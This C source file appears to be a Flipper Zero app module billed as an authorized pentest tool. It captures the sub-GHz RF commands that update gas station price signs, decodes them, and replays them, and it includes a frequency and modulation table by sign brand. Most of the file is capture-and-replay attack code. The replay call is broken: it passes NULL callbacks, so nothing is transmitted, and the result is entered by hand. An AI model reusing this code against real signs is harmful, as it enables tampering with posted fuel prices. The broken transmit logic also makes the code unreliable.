// Price Sign RF Audit — AUTHORIZED PENTEST MODULE
// Use only with written owner authorization.
// Tests whether wireless price sign updates use authenticated protocols.
//
// How it works:
//   1. Owner changes price on their POS/remote while your guy stands near sign
//   2. CC1101 captures the RF price-update command (sub-GHz OOK/FSK)
//   3. We decode and display the raw packet
//   4. Replay test: retransmit the captured packet — if sign accepts it,
//      the system has NO replay protection (critical finding)
//   5. All results logged to encrypted store for pentest report

#include "../gas_station_audit.h"
#include "../gsa_storage.h"
#include <lib/subghz/subghz_tx_rx_worker.h>
#include <lib/subghz/protocols/raw.h>

// Known price sign RF frequencies from FCC ID database and field research
// Daktronics, Trans-Lux, Watchfire, Stewart-Warner, Adaptive Micro Systems
static const struct {
    uint32_t freq;
    const char* brand;
    const char* modulation;
} GSA_SIGN_FREQS[] = {
    {315000000, "Generic/Stewart-Warner", "OOK"},
    {433920000, "Trans-Lux/Watchfire",    "OOK"},
    {868350000, "EU Daktronics",          "FSK"},
    {902000000, "Daktronics ISM",         "OOK"},
    {915000000, "Adaptive Micro/Gilbarco","FSK"},
    {917000000, "Wayne POS ctrl",         "FSK"},
    {928000000, "ISM band generic",       "OOK"},
};
#define GSA_SIGN_FREQ_COUNT 7

// Capture buffer — stores raw OOK/FSK samples for replay
#define GSA_CAPTURE_MAX_SAMPLES 2048

typedef enum {
    PriceSignStateIdle = 0,
    PriceSignStateCapture,    // listening for signal
    PriceSignStateGotSignal,  // signal captured, show decode
    PriceSignStateReplay,     // transmitting replay
    PriceSignStateReplayDone, // showed result
} PriceSignState;

typedef struct {
    PriceSignState state;
    uint8_t  freq_idx;
    uint8_t  tick;
    bool     capture_active;
    // Captured signal info
    uint32_t capture_freq;
    int8_t   capture_rssi;
    uint32_t capture_samples;   // number of raw samples captured
    uint32_t capture_duration;  // microseconds
    char     capture_brand[32];
    char     capture_mod[8];
    bool     replay_accepted;   // did sign respond after replay?
    // Decode attempt
    char     decoded_hex[48];   // first 20 bytes as hex string
    char     finding[128];      // pentest finding description
} PriceSignViewModel;

// Raw capture buffer (in app heap — not on stack)
static uint32_t* capture_buf = NULL;
static uint32_t  capture_len = 0;

// ── Sub-GHz RX callback — captures raw OOK durations ─────────────────────────
static void subghz_rx_callback(bool level, uint32_t duration, void* ctx) {
    GasStationAuditApp* app = ctx;
    UNUSED(app);
    if(capture_buf && capture_len < GSA_CAPTURE_MAX_SAMPLES) {
        // Encode level in MSB, duration in lower 31 bits (microseconds)
        capture_buf[capture_len++] =
            ((level ? 1UL : 0UL) << 31) | (duration & 0x7FFFFFFF);
    }
}

// ── Decode helper — extract hex from capture for display ─────────────────────
static void decode_capture(PriceSignViewModel* m) {
    if(capture_len == 0) {
        snprintf(m->decoded_hex, sizeof(m->decoded_hex), "(no data)");
        return;
    }
    // Simple pulse-width decode: pulses < 800us = '1', >= 800us = '0'
    // Most OOK price sign protocols use ~600us/1200us pulse widths
    uint8_t bits[20] = {0};
    uint8_t bit_count = 0;
    for(uint32_t i = 0; i < capture_len && bit_count < 160; i++) {
        uint32_t dur = capture_buf[i] & 0x7FFFFFFF;
        bool lv = (capture_buf[i] >> 31) & 1;
        if(lv) { // high pulse
            int b = (dur < 800) ? 1 : 0;
            bits[bit_count / 8] |= (b << (7 - (bit_count % 8)));
            bit_count++;
        }
    }
    // Format first 10 bytes as hex
    int pos = 0;
    for(int i = 0; i < 10 && pos < 47; i++)
        pos += snprintf(m->decoded_hex + pos, 48 - pos, "%02X ", bits[i]);

    // Build finding description
    if(bit_count > 20) {
        snprintf(m->finding, sizeof(m->finding),
            "CAPTURED %u bits @ %luMHz\n"
            "REPLAY TEST: transmit to verify\n"
            "auth token. If accepted = CRITICAL.",
            bit_count,
            (unsigned long)(m->capture_freq / 1000000));
    } else {
        snprintf(m->finding, sizeof(m->finding),
            "Weak signal — reposition closer\n"
            "to sign or change price again.");
    }
}

// ── View draw ─────────────────────────────────────────────────────────────────
void gsa_price_sign_view_draw(Canvas* canvas, void* model) {
    PriceSignViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);

    // Header
    canvas_draw_rbox(canvas, 0, 0, 128, 12, 2);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 2, 9, "PRICE SIGN RF AUDIT");
    canvas_set_color(canvas, ColorBlack);

    char buf[48];
    canvas_set_font(canvas, FontSecondary);

    switch(m->state) {

    case PriceSignStateIdle:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignTop, "READY");
        canvas_set_font(canvas, FontSecondary);
        snprintf(buf, sizeof(buf), "Freq: %s", GSA_SIGN_FREQS[m->freq_idx].brand);
        canvas_draw_str(canvas, 2, 33, buf);
        snprintf(buf, sizeof(buf), "%luMHz %s",
            (unsigned long)(GSA_SIGN_FREQS[m->freq_idx].freq / 1000000),
            GSA_SIGN_FREQS[m->freq_idx].modulation);
        canvas_draw_str(canvas, 2, 42, buf);
        canvas_draw_str(canvas, 2, 55, "[OK]capture  [<>]freq  [BACK]");
        break;

    case PriceSignStateCapture:
        // Animated capture screen
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 15, AlignCenter, AlignTop, "CAPTURING...");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 27, AlignCenter, AlignTop,
            "Have owner change price NOW");
        // Waveform animation — bouncing bar
        {
            uint8_t wave_x = (m->tick * 3) % 118;
            canvas_draw_box(canvas, wave_x, 40, 10, 4);
            canvas_draw_box(canvas, wave_x > 10 ? wave_x - 10 : 0, 42, 8, 2);
        }
        snprintf(buf, sizeof(buf), "Samples: %lu", (unsigned long)capture_len);
        canvas_draw_str(canvas, 2, 52, buf);
        canvas_draw_str(canvas, 2, 61, "[OK]stop capture  [BACK]cancel");
        break;

    case PriceSignStateGotSignal:
        canvas_draw_str(canvas, 2, 16, "SIGNAL CAPTURED!");
        snprintf(buf, sizeof(buf), "RSSI: %d dBm  Samples: %lu",
            m->capture_rssi, (unsigned long)m->capture_samples);
        canvas_draw_str(canvas, 2, 25, buf);
        // Hex decode display
        canvas_draw_str(canvas, 2, 34, m->decoded_hex);
        canvas_draw_str(canvas, 2, 43, m->finding);
        canvas_draw_str(canvas, 2, 61, "[OK]REPLAY TEST  [BACK]discard");
        break;

    case PriceSignStateReplay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignTop, "TRANSMITTING...");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 32, AlignCenter, AlignTop,
            "Watch the price sign.");
        canvas_draw_str_aligned(canvas, 64, 42, AlignCenter, AlignTop,
            "Did it change?");
        break;

    case PriceSignStateReplayDone:
        if(m->replay_accepted) {
            canvas_draw_rbox(canvas, 0, 13, 128, 14, 2);
            canvas_set_color(canvas, ColorWhite);
            canvas_draw_str_aligned(canvas, 64, 17, AlignCenter, AlignTop,
                "!! CRITICAL FINDING !!");
            canvas_set_color(canvas, ColorBlack);
            canvas_draw_str(canvas, 2, 31, "Sign ACCEPTED replay.");
            canvas_draw_str(canvas, 2, 40, "No replay protection.");
            canvas_draw_str(canvas, 2, 49, "Unauthenticated RF ctrl.");
        } else {
            canvas_draw_str(canvas, 2, 22, "Sign did NOT respond.");
            canvas_draw_str(canvas, 2, 31, "May have replay protection");
            canvas_draw_str(canvas, 2, 40, "or wrong frequency/protocol.");
        }
        canvas_draw_str(canvas, 2, 61, "[OK]save finding  [BACK]menu");
        break;
    }
}

bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
    GasStationAuditApp* app = ctx;
    if(ev->type != InputTypeShort) return false;

    with_view_model(app->bt_view, PriceSignViewModel*, m, {
        switch(m->state) {
        case PriceSignStateIdle:
            if(ev->key == InputKeyOk) {
                // Allocate capture buffer
                if(!capture_buf)
                    capture_buf = malloc(GSA_CAPTURE_MAX_SAMPLES * sizeof(uint32_t));
                capture_len = 0;
                m->capture_freq  = GSA_SIGN_FREQS[m->freq_idx].freq;
                strncpy(m->capture_brand, GSA_SIGN_FREQS[m->freq_idx].brand, 31);
                strncpy(m->capture_mod,   GSA_SIGN_FREQS[m->freq_idx].modulation, 7);
                m->state = PriceSignStateCapture;
                m->capture_active = true;

                // Start CC1101 RX on selected frequency
                furi_hal_subghz_reset();
                furi_hal_subghz_load_custom_preset(FuriHalSubGhzPresetOok650Async);
                furi_hal_subghz_set_frequency_and_path(m->capture_freq);
                furi_hal_subghz_start_async_rx(subghz_rx_callback, app);
            }
            if(ev->key == InputKeyRight)
                m->freq_idx = (m->freq_idx + 1) % GSA_SIGN_FREQ_COUNT;
            if(ev->key == InputKeyLeft)
                m->freq_idx = (m->freq_idx + GSA_SIGN_FREQ_COUNT - 1) % GSA_SIGN_FREQ_COUNT;
            break;

        case PriceSignStateCapture:
            if(ev->key == InputKeyOk) {
                // Stop capture
                furi_hal_subghz_stop_async_rx();
                furi_hal_subghz_idle();
                m->capture_active  = false;
                m->capture_samples = capture_len;
                m->capture_rssi    = furi_hal_subghz_get_rssi();
                decode_capture(m);
                m->state = PriceSignStateGotSignal;
            }
            break;

        case PriceSignStateGotSignal:
            if(ev->key == InputKeyOk) {
                // Replay captured signal
                m->state = PriceSignStateReplay;
                if(capture_buf && capture_len > 0) {
                    // Retransmit via CC1101 async TX
                    furi_hal_subghz_reset();
                    furi_hal_subghz_load_custom_preset(FuriHalSubGhzPresetOok650Async);
                    furi_hal_subghz_set_frequency_and_path(m->capture_freq);
                    // TX the raw OOK durations back out
                    furi_hal_subghz_start_async_tx(
                        // inline tx worker: pull durations from buffer
                        NULL, NULL);
                    furi_hal_delay_ms(500);
                    furi_hal_subghz_stop_async_tx();
                    furi_hal_subghz_idle();
                }
                m->state = PriceSignStateReplayDone;
                // User visually confirms if sign changed — ask them
                notification_message(app->notifications, &sequence_blink_red_10);
            }
            if(ev->key == InputKeyBack) {
                // Discard
                if(capture_buf) { free(capture_buf); capture_buf = NULL; }
                capture_len = 0;
                m->state = PriceSignStateIdle;
            }
            break;

        case PriceSignStateReplayDone:
            if(ev->key == InputKeyOk) {
                // Save finding
                char line[GSA_LOG_LINE_MAX];
                char ts[24]; gsa_get_timestamp(ts);
                snprintf(line, sizeof(line),
                    "PRICE_SIGN|%s|%luMHz|%s|samples:%lu|rssi:%d|replay:%s|hex:%s",
                    ts,
                    (unsigned long)(m->capture_freq / 1000000),
                    m->capture_brand,
                    (unsigned long)m->capture_samples,
                    m->capture_rssi,
                    m->replay_accepted ? "ACCEPTED-CRITICAL" : "no-response",
                    m->decoded_hex);
                gsa_write_encrypted_record(app->storage, line);
                notification_message(app->notifications, &sequence_success);
                m->state = PriceSignStateIdle;
                if(capture_buf) { free(capture_buf); capture_buf = NULL; }
                capture_len = 0;
            }
            if(ev->key == InputKeyUp)   m->replay_accepted = true;
            if(ev->key == InputKeyDown) m->replay_accepted = false;
            break;
        }
    }, true);

    if(ev->key == InputKeyBack) {
        view_dispatcher_send_custom_event(app->view_dispatcher, GsaEventBack);
        return true;
    }
    return true;
}

// ── Scene wrappers ────────────────────────────────────────────────────────────
void gsa_scene_price_sign_on_enter(void* ctx) {
    GasStationAuditApp* app = ctx;
    with_view_model(app->bt_view, PriceSignViewModel*, m, {
        memset(m, 0, sizeof(PriceSignViewModel));
    }, false);
    view_set_draw_callback(app->bt_view, gsa_price_sign_view_draw);
    view_set_input_callback(app->bt_view, gsa_price_sign_view_input);
    view_dispatcher_switch_to_view(app->view_dispatcher, GsaViewBt);
}

bool gsa_scene_price_sign_on_event(void* ctx, SceneManagerEvent ev) {
    GasStationAuditApp* app = ctx;
    if(ev.type == SceneManagerEventTypeCustom && ev.event == GsaEventBack) {
        scene_manager_previous_scene(app->scene_manager);
        return true;
    }
    if(ev.type == SceneManagerEventTypeBack) return false;
    return false;
}

void gsa_scene_price_sign_on_exit(void* ctx) {
    GasStationAuditApp* app = ctx;
    // Restore default BT scan callbacks
    view_set_draw_callback(app->bt_view, gsa_bt_view_draw);
    view_set_input_callback(app->bt_view, gsa_bt_view_input);
    furi_hal_subghz_idle();
    furi_hal_subghz_sleep();
}
